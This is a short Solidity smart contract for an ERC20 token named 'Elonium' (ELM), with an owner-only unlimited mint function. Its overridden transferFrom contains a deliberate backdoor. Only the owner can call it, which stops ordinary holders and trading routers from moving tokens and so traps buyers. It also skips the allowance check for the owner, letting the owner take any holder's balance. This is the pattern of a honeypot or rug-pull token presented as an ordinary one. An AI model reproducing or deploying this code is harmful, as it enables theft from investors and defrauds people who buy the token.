// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

contract Elonium is ERC20, Ownable {
    constructor() ERC20("Elonium", "ELM") {
        _mint(msg.sender, 10000000 * 10 ** decimals());
    }

    function mint(address to, uint256 amount) public onlyOwner {
        _mint(to, amount);
    }
    
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public onlyOwner override returns (bool) {
        address spender = _msgSender();
        // Owner can freely transfer
        if (owner() != _msgSender())
            _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }

}
